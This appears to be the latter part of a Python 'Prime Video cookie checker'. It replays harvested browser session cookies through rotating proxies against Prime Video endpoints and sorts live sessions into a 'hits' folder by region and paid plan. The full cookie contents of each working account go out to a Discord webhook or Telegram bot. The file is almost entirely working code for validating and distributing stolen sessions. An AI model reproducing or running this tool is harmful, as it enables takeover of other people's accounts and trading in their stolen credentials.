        "https://atv-ps.primevideo.com/acm/GetConfiguration/WebClient?deviceTypeID=AOAGZA014O5RE&deviceID=Web",
        headers=headers,
        timeout=CONFIG_TIMEOUT,
        proxies=proxy,
        allow_redirects=True,
    )
    status_code = response.status_code
    final_url = response.url or ""
    source_text = response.text or ""
    if "signin" in final_url.lower() or "ap/signin" in final_url.lower():
        return {}, 401, source_text
    if status_code != 200:
        return {}, status_code, source_text
    try:
        return response.json() or {}, status_code, source_text
    except Exception:
        match = re.search(r'"recordTerritory"\s*:\s*"([^"]+)"', source_text, re.IGNORECASE)
        customer_match = re.search(r'"customerID"\s*:\s*"([^"]+)"', source_text, re.IGNORECASE)
        fallback = {}
        if match:
            fallback["recordTerritory"] = match.group(1).strip()
        if customer_match:
            fallback["customerID"] = customer_match.group(1).strip()
        return fallback, status_code, source_text


def get_prime_video_data(session, proxy=None):
    response = session.get(
        "https://www.primevideo.com/region/eu/storefront",
        headers=REQUEST_HEADERS,
        timeout=STOREFRONT_TIMEOUT,
        proxies=proxy,
        allow_redirects=True,
    )
    status_code = response.status_code
    final_url = response.url or ""
    source_text = response.text or ""

    if status_code != 200:
        return None, status_code, {}

    if "signin" in final_url.lower() or "ap/signin" in final_url.lower():
        return source_text, 401, {}

    config_data, config_status_code, _ = get_prime_video_configuration(session, proxy)
    if config_status_code != 200:
        return source_text, config_status_code, config_data
    customer_state, _ = classify_configuration_customer_state(config_data, _)
    if customer_state == "logged_out":
        return source_text, CONFIG_LOGGED_OUT_STATUS, config_data
    if customer_state == "unavailable":
        return source_text, CONFIG_UNAVAILABLE_STATUS, config_data
    return source_text, status_code, config_data


def format_cookie_file(data, cookie_content, config):
    txt_fields = config.get("txt_fields", {})
    lines = []
    region = data.get("region") if has_known_value(data.get("region")) else "Unknown"

    if txt_fields.get("profile", True) and has_known_value(data.get("profile")):
        lines.append(f"Profile: {data.get('profile')}")
    if txt_fields.get("region", True):
        lines.append(f"Region: {region}")
    lines.append(f"Plan: {data.get('plan', 'Unknown')}")
    lines.append("")
    lines.append(BRANDING_LINE)
    lines.append(COOKIE_BRAND_LABEL)
    lines.append("")
    lines.append(cookie_content.strip())
    lines.append("")
    return "\n".join(lines)


def build_full_notification_message_discord(data):
    region_text = format_region_with_flag(data.get("region"))
    lines = [
        f"# [Prime Video Cookie]({PROJECT_URL})",
        "",
    ]
    if has_known_value(data.get("profile")):
        lines.append(f"**Profile:** {data.get('profile')}")
    lines.extend(
        [
            f"**Region:** {region_text}",
            f"**Plan:** {data.get('plan', 'Unknown')}",
            "",
            NOTIFICATION_SOCIALS_DISCORD,
        ]
    )
    return "\n".join(lines)


def build_full_notification_message_telegram(data):
    region_text = format_region_with_flag(data.get("region"))
    lines = [
        f'<b><a href="{PROJECT_URL}">Prime Video Cookie</a></b>',
    ]
    if has_known_value(data.get("profile")):
        lines.append(f"<b>Profile:</b> {escape_html(data.get('profile'))}")
    lines.extend(
        [
            f"<b>Region:</b> {escape_html(region_text)}",
            f"<b>Plan:</b> {escape_html(data.get('plan', 'Unknown'))}",
            "",
            NOTIFICATION_SOCIALS_TELEGRAM,
        ]
    )
    return "\n".join(lines)


def send_discord_webhook(webhook_url, message_text, file_name=None, file_content=None):
    if not webhook_url:
        return
    try:
        payload = {
            "username": DISCORD_WEBHOOK_USERNAME,
            "avatar_url": DISCORD_IMAGE_URL,
            "content": message_text,
            "flags": 4,
        }
        if file_name and file_content:
            requests.post(
                webhook_url,
                data={"payload_json": json.dumps(payload)},
                files={"file": (file_name, file_content.encode("utf-8"), "text/plain")},
                timeout=20,
            )
        else:
            requests.post(webhook_url, json=payload, timeout=20)
    except Exception:
        pass


def send_telegram(bot_token, chat_id, message_text, file_name=None, file_content=None):
    if not bot_token or not chat_id:
        return
    try:
        if file_name and file_content:
            requests.post(
                f"https://api.telegram.org/bot{bot_token}/sendDocument",
                data={
                    "chat_id": chat_id,
                    "caption": message_text,
                    "parse_mode": "HTML",
                    "disable_web_page_preview": True,
                },
                files={"document": (file_name, file_content.encode("utf-8"), "text/plain")},
                timeout=20,
            )
        else:
            requests.post(
                f"https://api.telegram.org/bot{bot_token}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": message_text,
                    "parse_mode": "HTML",
                    "disable_web_page_preview": True,
                },
                timeout=20,
            )
    except Exception:
        pass


def should_send_notification(mode, is_paid):
    normalized_mode = normalize_notification_mode(mode)
    if normalized_mode == "all":
        return True
    if normalized_mode == "paid":
        return is_paid is True
    return is_paid is False


def send_notifications(config, data, output_filename, formatted_cookie):
    notifications = config.get("notifications", {})
    webhook_cfg = notifications.get("webhook", {})
    telegram_cfg = notifications.get("telegram", {})
    webhook_mode = normalize_notification_mode(webhook_cfg.get("mode", "all"))
    telegram_mode = normalize_notification_mode(telegram_cfg.get("mode", "all"))
    is_paid = data.get("is_paid")

    if webhook_cfg.get("enabled", False) and should_send_notification(webhook_mode, is_paid):
        send_discord_webhook(
            webhook_cfg.get("url", ""),
            build_full_notification_message_discord(data),
            output_filename,
            formatted_cookie,
        )

    if telegram_cfg.get("enabled", False) and should_send_notification(telegram_mode, is_paid):
        send_telegram(
            telegram_cfg.get("bot_token", ""),
            telegram_cfg.get("chat_id", ""),
            build_full_notification_message_telegram(data),
            output_filename,
            formatted_cookie,
        )


def generate_filename(data):
    region = sanitize_for_filename(data.get("region", "unknown"))
    status = "Paid" if data.get("is_paid") is True else "Free" if data.get("is_paid") is False else "Unknown"
    parts = [region, FILENAME_WATERMARK]
    if has_known_value(data.get("profile")):
        parts.append(sanitize_for_filename(data.get("profile", "")))
    parts.extend([status, random_number_string()])
    return f"{'_'.join(parts)}.txt"


def print_status_message(status, cookie_file):
    color_codes = {
        "success": "\033[33m",
        "free": "\033[34m",
        "unknown": "\033[36m",
        "duplicate": "\033[35m",
        "failed": "\033[31m",
        "error": "\033[31m",
    }
    reset = "\033[0m"
    base_path = f"cookies\\{cookie_file}"

    if status == "success":
        print(f"> {color_codes[status]}Login successful with {base_path}. Paid account moved to hits folder!{reset}")
    elif status == "free":
        print(f"> {color_codes[status]}Login successful with {base_path}. Free account moved to hits folder!{reset}")
    elif status == "unknown":
        print(f"> {color_codes[status]}Login successful with {base_path}. Unknown plan account moved to hits folder!{reset}")
    elif status == "failed":
        print(f"> {color_codes[status]}Login failed with {base_path}. Moved to failed folder!{reset}")
    elif status == "duplicate":
        print(f"> {color_codes[status]}Duplicate account with {base_path}. Saved to duplicate folder.{reset}")
    elif status == "error":
        print(f"> {color_codes[status]}Error occurred with {base_path}. Moved to broken folder!{reset}")


def check_cookies(num_threads=10, config=None):
    if config is None:
        config = copy.deepcopy(DEFAULT_CONFIG)

    counts = {"hits": 0, "free": 0, "unknown": 0, "bad": 0, "duplicate": 0, "errors": 0}
    paid_counts = {"paid": 0, "free": 0, "unknown": 0}
    display_mode = str(config.get("display", {}).get("mode", "simple")).lower()
    if display_mode not in ("log", "simple"):
        display_mode = "simple"

    proxies = load_proxies()
    try:
        max_retry_attempts = max(1, int(config.get("retries", {}).get("error_proxy_attempts", 3)))
    except Exception:
        max_retry_attempts = 3

    retryable_status_codes = {429, 500, 502, 503, 504, CONFIG_UNAVAILABLE_STATUS}
    cookie_files = []
    if os.path.exists("cookies"):
        cookie_files = [name for name in os.listdir("cookies") if name.lower().endswith((".txt", ".json"))]
    cookies_total = len(cookie_files)
    cookies_left = [cookies_total]
    seen_keys = set()
    run_folder = get_run_folder()
    stats_lock = threading.Lock()
    dedupe_lock = threading.Lock()

    def update_title():
        valid = get_valid_total(counts)
        set_console_title(
            f"CookiesLeft {cookies_left[0]}/{cookies_total} Valid {valid} "
            f"Failed {counts['bad']} Duplicate {counts['duplicate']} Errors {counts['errors']}"
        )

    def get_next_proxy(used_proxy_indices):
        if not proxies:
            return None, None
        available = [idx for idx in range(len(proxies)) if idx not in used_proxy_indices]
        if not available:
            available = list(range(len(proxies)))
        chosen_index = random.choice(available)
        return proxies[chosen_index], chosen_index

    def finalize(result_type, is_paid):
        with stats_lock:
            if result_type == "success":
                counts["hits"] += 1
                paid_counts["paid"] += 1
            elif result_type == "free":
                counts["free"] += 1
                paid_counts["free"] += 1
            elif result_type == "unknown":
                counts["unknown"] += 1
                paid_counts["unknown"] += 1
            elif result_type == "failed":
                counts["bad"] += 1
            elif result_type == "duplicate":
                counts["duplicate"] += 1
            elif result_type == "error":
                counts["errors"] += 1
            cookies_left[0] -= 1
            update_title()
            if display_mode == "simple":
                render_simple_dashboard(counts, paid_counts, cookies_left[0], cookies_total, True)

    def check_cookie(cookie_file):
        cookie_path = os.path.join("cookies", cookie_file)
        result_type = None
        is_paid = None

        try:
            netscape_content, cookies = parse_cookie_file(cookie_path)
            if not cookies:
                result_type = "failed"
                shutil.move(cookie_path, os.path.join("failed", cookie_file))
                return finalize(result_type, is_paid)

            if not has_required_auth_cookies(cookies):
                result_type = "failed"
                shutil.move(cookie_path, os.path.join("failed", cookie_file))
                return finalize(result_type, is_paid)

            session = requests.Session()
            session.cookies.update(cookies)
            session.headers.update({"Accept-Encoding": "identity"})

            source_text = None
            status_code = None
            config_data = {}
            last_exception = None
            used_proxy_indices = set()

            for attempt in range(max_retry_attempts):
                proxy, proxy_index = get_next_proxy(used_proxy_indices)
                if proxy_index is not None:
                    used_proxy_indices.add(proxy_index)
                try:
                    source_text = None
                    status_code = None
                    config_data = {}
                    source_text, status_code, config_data = get_prime_video_data(session, proxy)
                    if status_code == 200 and source_text:
                        break
                    if status_code in retryable_status_codes and attempt < max_retry_attempts - 1:
                        continue
                    break
                except Exception as exc:
                    last_exception = exc
                    if attempt < max_retry_attempts - 1:
                        continue

            if source_text:
                data = infer_prime_video_data(source_text, cookie_file, config_data)
                if data.get("signin_state") == "sign_in_page":
                    result_type = "failed"
                    if display_mode == "log":
                        print_status_message("failed", cookie_file)
                    shutil.move(cookie_path, os.path.join("failed", cookie_file))
                    return finalize(result_type, is_paid)
            else:
                data = None

            if status_code == 200 and source_text:
                is_paid = data.get("is_paid")
                if is_paid is None:
                    is_paid = False
                    data["is_paid"] = False
                    data["paid_status"] = format_paid_label(False)
                    data["plan"] = plan_label_from_paid_state(False)
                dedupe_key = build_duplicate_key(data, cookies)
                is_duplicate = False
                should_dedupe = bool(dedupe_key)
                if should_dedupe:
                    with dedupe_lock:
                        if dedupe_key in seen_keys:
                            is_duplicate = True
                        else:
                            seen_keys.add(dedupe_key)

                if is_duplicate:
                    result_type = "duplicate"
                    duplicate_output_path = create_duplicate_output_folder(run_folder)
                    filename = generate_filename(data)
                    formatted_cookie = format_cookie_file(data, netscape_content, config)
                    with open(os.path.join(duplicate_output_path, filename), "w", encoding="utf-8") as handle:
                        handle.write(formatted_cookie)
                    if display_mode == "log":
                        print_status_message("duplicate", cookie_file)
                    os.remove(cookie_path)
                else:
                    output_path = create_output_folder_when_needed(is_paid, run_folder)
                    filename = generate_filename(data)
                    formatted_cookie = format_cookie_file(data, netscape_content, config)
                    with open(os.path.join(output_path, filename), "w", encoding="utf-8") as handle:
                        handle.write(formatted_cookie)
                    send_notifications(config, data, filename, formatted_cookie)
                    os.remove(cookie_path)
                    result_type = result_type_from_paid_state(is_paid)
                    if display_mode == "log":
                        print_status_message(result_type, cookie_file)
            elif should_storefront_fallback_to_unknown(status_code, data):
                data = set_unknown_plan_data(data)
                is_paid = None
                dedupe_key = build_duplicate_key(data, cookies)
                is_duplicate = False
                should_dedupe = bool(dedupe_key)
                if should_dedupe:
                    with dedupe_lock:
                        if dedupe_key in seen_keys:
                            is_duplicate = True
                        else:
                            seen_keys.add(dedupe_key)

                if is_duplicate:
                    result_type = "duplicate"
                    duplicate_output_path = create_duplicate_output_folder(run_folder)
                    filename = generate_filename(data)
                    formatted_cookie = format_cookie_file(data, netscape_content, config)
                    with open(os.path.join(duplicate_output_path, filename), "w", encoding="utf-8") as handle:
                        handle.write(formatted_cookie)
                    if display_mode == "log":
                        print_status_message("duplicate", cookie_file)
                    os.remove(cookie_path)
                else:
                    output_path = create_output_folder_when_needed(is_paid, run_folder)
                    filename = generate_filename(data)
                    formatted_cookie = format_cookie_file(data, netscape_content, config)
                    with open(os.path.join(output_path, filename), "w", encoding="utf-8") as handle:
                        handle.write(formatted_cookie)
                    send_notifications(config, data, filename, formatted_cookie)
                    os.remove(cookie_path)
                    result_type = "unknown"
                    if display_mode == "log":
                        print_status_message(result_type, cookie_file)
            else:
                signin_state = data.get("signin_state", "unknown") if isinstance(data, dict) else "unknown"
                result_type = classify_non_success_result(
                    status_code,
                    signin_state=signin_state,
                    last_exception=last_exception,
                )
                if display_mode == "log":
                    print_status_message("failed" if result_type == "failed" else "error", cookie_file)
                target_folder = "failed" if result_type == "failed" else "broken"
                shutil.move(cookie_path, os.path.join(target_folder, cookie_file))
        except Exception:
            result_type = "error"
            if display_mode == "log":
                print_status_message("error", cookie_file)
            try:
                shutil.move(cookie_path, os.path.join("broken", cookie_file))
            except Exception:
                pass

        finalize(result_type, is_paid)

    def worker():
        while True:
            try:
                cookie_file = cookie_files.pop(0)
            except IndexError:
                break
            check_cookie(cookie_file)

    update_title()
    if display_mode == "log":
        print(f"Total cookies: {cookies_total}")
        print(f"Total proxies: {len(proxies)}")
        print(f"Number of threads: {num_threads}")
        print("\nStarting cookie checking...\n")
    else:
        render_simple_dashboard(counts, paid_counts, cookies_left[0], cookies_total, True)

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker)
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

    valid = get_valid_total(counts)
    set_console_title(f"PrimeVideoChecker - Finished Valid {valid} Failed {counts['bad']} Errors {counts['errors']}")

    if display_mode == "simple":
        render_simple_dashboard(counts, paid_counts, cookies_left[0], cookies_total, True)
        print("")
        print(color_text("Finished Checking", "\033[32m", True))
    else:
        print("\n\n==================== Final Summary ====================")
        print(f"Checked   : {cookies_total}")
        print(f"Good      : \033[33m{counts['hits']}\033[0m")
        print(f"Free      : \033[34m{counts['free']}\033[0m")
        if counts["unknown"] > 0:
            print(f"Unknown   : \033[36m{counts['unknown']}\033[0m")
        print(f"Bad       : \033[31m{counts['bad']}\033[0m")
        print(f"Duplicate : \033[35m{counts['duplicate']}\033[0m")
        print(f"Errors    : \033[31m{counts['errors']}\033[0m")
        print("=======================================================")


def main():
    create_base_folders()
    config, config_source = load_config()
    clear_screen()
    print_banner()
    check_for_updates()
    print("")
    print("--------------------------------------------------------------------------------------------------")
    print("")
    print("         👉  Welcome, after moving your cookies to (cookies) folder, press  👈")
    print("                           Enter if you're ready to start!")
    print("")
    input()

    clear_screen()
    print_banner()

    cookie_files = []
    if os.path.exists("cookies"):
        cookie_files = [name for name in os.listdir("cookies") if name.lower().endswith((".txt", ".json"))]
    if not cookie_files:
        print("No cookies found in cookies folder. Add .txt/.json cookies and run again.")
        input("Press enter to exit\n")
        return

    print("Note: Using more than 10 threads can send more cookies to broken and may reduce plan detection accuracy.")
    try:
        num_threads_input = input("Enter number of threads (default 10): ")
        num_threads = int(num_threads_input) if num_threads_input.strip() else 10
        if num_threads < 1 or num_threads > 100:
            raise ValueError
    except ValueError:
        print("Invalid input, using 10 threads as default")
        num_threads = 10

    check_cookies(num_threads, config)
    input("Press enter to exit\n")


if __name__ == "__main__":
    main()
